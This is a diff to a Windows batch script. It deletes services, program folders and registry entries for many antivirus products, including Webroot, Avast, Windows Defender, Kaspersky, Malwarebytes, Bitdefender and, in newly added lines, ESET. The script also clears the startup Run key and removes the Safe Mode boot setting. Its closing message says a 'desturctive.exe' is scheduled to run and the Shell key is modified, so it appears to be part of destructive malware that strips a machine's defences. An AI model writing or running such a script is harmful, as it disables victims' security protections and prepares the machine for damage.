@@ -149,7 +149,7 @@ echo Removing Safe Mode setting...
 bcdedit /deletevalue {current} safeboot
 
 :: Delete registry keys related to antivirus services
-echo Deleting registry keys...
+:: Webroot non registry
 sc delete WRSkyClient
 sc delete WRCoreService
 sc delete WRSVC
@@ -163,8 +163,11 @@ rd /s /q "C:\ProgramData\WRData\"
 rd /s /q "C:\Program Files\Webroot\"
 rd /s /q "C:\Program Files (x86)\Webroot\"
 rd /s /q "C:\ProgramData\WRCore\"
-reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f
+
+echo Deleting registry keys...
+:: Startup 
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
+:: Avast
 reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f
@@ -188,23 +191,38 @@ reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
+:: Webroot
+reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f
 reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
 reg Delete "HKLM\SOFTWARE\WRData" /f
 reg Delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
 reg Delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
 reg Delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
+:: Windows Defender
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f
+:: Kaspersky 21.3
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f
+:: Malwarebytes
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f
+:: Bitdefender
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f
+:: ESET
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
